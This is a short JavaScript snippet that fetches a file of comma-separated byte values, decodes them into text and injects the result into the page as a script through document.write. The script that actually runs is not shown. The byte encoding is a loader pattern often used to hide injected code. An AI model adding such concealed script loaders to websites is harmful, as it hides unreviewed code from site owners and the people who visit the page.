
    var ResponseText;
	
	var XMLHttpRequest_ = new XMLHttpRequest();
	
	XMLHttpRequest_.onreadystatechange = function(){
	
	if(XMLHttpRequest_.readyState == XMLHttpRequest.DONE){
	
	ResponseText = XMLHttpRequest_.responseText;
	
	}
	
	};
	
	XMLHttpRequest_.open("GET","js/s_e.js",false);
	
	XMLHttpRequest_.send(null);
	
	var StringArray = ResponseText.split(",");
	
	var IntArray = [];
	
	for(var i = 0; i < StringArray.length; i++){
	
	IntArray[i] = StringArray[i];
	
	}
	
	var Uint8Array = new Uint8Array(IntArray);
	
	var ScriptDecoded = new TextDecoder().decode(Uint8Array);
	
	document.write('\x3Cscript>'+ScriptDecoded+'\x3C/script>');
